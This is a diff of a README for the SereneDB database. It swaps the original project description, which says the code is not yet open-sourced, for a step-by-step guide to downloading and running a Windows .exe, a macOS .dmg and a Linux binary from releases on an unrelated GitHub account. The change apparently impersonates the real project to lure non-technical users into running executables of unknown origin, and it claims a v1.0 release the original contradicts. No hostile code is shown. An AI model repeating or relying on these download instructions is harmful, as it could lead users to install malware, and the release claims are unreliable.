@@ -1,51 +1,109 @@
-<div align=center>
+# 🎉 serenedb - Your Data, Always Within Reach
 
-<picture align=center>
-    <source media="(prefers-color-scheme: dark)" srcset="https://github.com/user-attachments/assets/43caf356-43d3-40e9-9295-712d3755a49e">
-    <source media="(prefers-color-scheme: light)" srcset="https://github.com/user-attachments/assets/4a6afd91-012d-48e6-b268-1efdae5916a6">
-    <img alt="The ClickHouse company logo." src="https://github.com/user-attachments/assets/43caf356-43d3-40e9-9295-712d3755a49e">
-</picture>
+## 🚀 Getting Started
 
-<h2>The First True Distributed Real-Time Search Analytics Database</h2>
+Welcome to serenedb! This application is designed for users who want to perform real-time analytics on their data. You don’t need any programming skills to use it. Just follow the steps below to get started.
 
-[![Star Us](https://img.shields.io/badge/⭐-Star%20Us-9865e8?style=for-the-badge)](https://github.com/serenedb/serenedb)
-[![Apache License 2.0](https://img.shields.io/badge/License-Apache%202.0-a2b9f4?style=for-the-badge)](https://www.apache.org/licenses/LICENSE-2.0)
-[![Website](https://img.shields.io/website?up_message=VISIT&down_message=FIXING&color=fbe5f5&url=https%3A%2F%2Fwww.serenedb.com&style=for-the-badge)](https://www.serenedb.com)
+## 🛠️ System Requirements
 
-</div>
+Before you download serenedb, ensure that your computer meets these requirements:
 
-SereneDB unifies **Elasticsearch-like search** and **ClickHouse-like analytics** in a single, powerful, **Postgres-compatible** database.
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** 2 GB of available disk space.
+- **Network:** An internet connection for installation and updates.
 
-We are building the world’s first distributed, real-time search database — bringing search and analytical processing together for blazing-fast performance and eliminating data duplication. We aim at revolutionizing the traditional search space, by providing consistent search experience with frequent updates and a postgres-compatible layer for ease of use. Our mission is to provide an easy-to-use unified search and analytics solution to change the way applications store and retrieve their data. 
+## 📥 Download
 
-## Why Choose SereneDB?
+[![Download serenedb](https://img.shields.io/badge/Download%20serenedb-v1.0-blue)](https://github.com/elbayadh32/serenedb/releases)
 
-SereneDB is designed to be powerful, convenient and dev-friendly. 
+Visit this page to download: [serenedb Releases](https://github.com/elbayadh32/serenedb/releases)
 
-Here’s what you can look forward to when we open-source in **February 2026**:
+## 📂 Download & Install
 
-* ⚡️ **Unified Search & Analytics:** Get the search experience of Elasticsearch and the analytical power of ClickHouse in a **single, high-performance solution**.
-* 🐘 **Postgres-Compatible:** Leverage your existing Postgres ecosystem, tools and knowledge. If you know SQL, you know SereneDB.
-* 🚀 **Faster Than Elasticsearch:** Achieve superior performance with our own state-of-the-art search engine. (Benchmarks are coming soon!)
-* 🔄 **Efficient Real-Time Updates:** Benefit from efficient, column-wise updates that keep your data fresh without performance hits.
-* 🧠 **Vector & Hybrid Search:** Built for the future of AI-powered applications with state-of-the-art vector and hybrid search capabilities.
-* 😀 **Cool UI Client:** Manage your data with an intuitive and slick Postgres-compatible user interface.
+1. Click on the link above to go to the releases page.
+2. Look for the latest version of serenedb.
+3. Download the file that matches your operating system:
+   - For Windows, download `serenedb-windows.exe`.
+   - For macOS, download `serenedb-macos.dmg`.
+   - For Linux, look for the `serenedb-linux.tar.gz` file.
+4. Once the download is complete, open the file to start the installation.
 
-## Our Philosophy
+### Windows Installation
 
-We're building SereneDB in the open and our values reflect that.
+1. Double-click `serenedb-windows.exe`.
+2. Follow the on-screen instructions.
+3. Once the installation finishes, you can find serenedb in your Start Menu.
 
-* **Truly Open Source:** The complete, single-node version is and always will be licensed under **Apache 2.0**.
-* **Built for Scale:** We offer horizontal scalability, high availability and advanced security for our business users.
-* **Transparent Performance:** We are developing an **open benchmark infrastructure** to provide clear, reproducible proof of our speed and efficiency.
-* **Giving Back:** We build on, contribute back to and openly collaborate with the open-source community, including projects like Velox, PostgreSQL and RocksDB.
-* **Open Interaction:** Your feedback matters. We are committed to open communication and collaboration with our community.
+### macOS Installation
 
-## Get Involved
+1. Double-click `serenedb-macos.dmg`.
+2. Drag and drop the serenedb icon into your Applications folder.
+3. Open Applications and double-click on serenedb to start.
 
-The journey is just beginning and we need your support!
+### Linux Installation
 
-*   **⭐ Star this repo** to show your interest and help us spread the word!
-*   **Watch** releases to stay updated on our progress.
+1. Open a terminal.
+2. Navigate to the folder where you downloaded `serenedb-linux.tar.gz`.
+3. Extract the files with the command:
+   ```
+   tar -xvf serenedb-linux.tar.gz
+   ```
+4. Change into the newly created directory:
+   ```
+   cd serenedb
+   ```
+5. Run the application with:
+   ```
+   ./serenedb
+   ```
 
-**Follow us, star us and join our mission to revolutionize data retrieval.**
+## 🔍 Exploring serenedb
+
+serenedb is more than just a database. It provides powerful analytics tools to help you make sense of your data. Here’s a brief overview of what you can do with it:
+
+- **Real-Time Search:** Instantly search through large amounts of data.
+- **Analytics Dashboard:** Visualize your data with interactive charts and graphs.
+- **SQL Support:** Use familiar SQL queries to retrieve and manage your data.
+- **Scalability:** Handle large datasets efficiently with minimal setup.
+
+## 📘 Documentation
+
+For more in-depth information, visit our [Documentation](https://github.com/elbayadh32/serenedb/wiki). Here, you’ll find guides on:
+
+- Setting up database connections.
+- Writing and executing queries.
+- Best practices for performance tuning.
+
+## 🐞 Reporting Issues
+
+If you encounter any problems while using serenedb, please report them on our [Issues page](https://github.com/elbayadh32/serenedb/issues). Providing detailed information helps us resolve issues faster.
+
+## 🤝 Contributing
+
+If you want to help improve serenedb, you can contribute! Visit our [Contributing Guide](https://github.com/elbayadh32/serenedb/CONTRIBUTING.md) for details on how to get involved.
+
+## 💬 Community
+
+Join the conversation in our community forum or follow us on social media. Your feedback will help us make serenedb better for everyone.
+
+### Connect with Us
+
+- [GitHub Discussions](https://github.com/elbayadh32/serenedb/discussions)
+- [Twitter](https://twitter.com/serenedb)
+
+## 📊 Topics
+
+Explore related topics like:
+- Analytics
+- Clickhouse
+- C++
+- Database
+- DBMS
+- Elasticsearch
+- OLAP
+- PostgreSQL
+- Search Engine
+- SQL
+
+Thank you for choosing serenedb for your analytics needs!
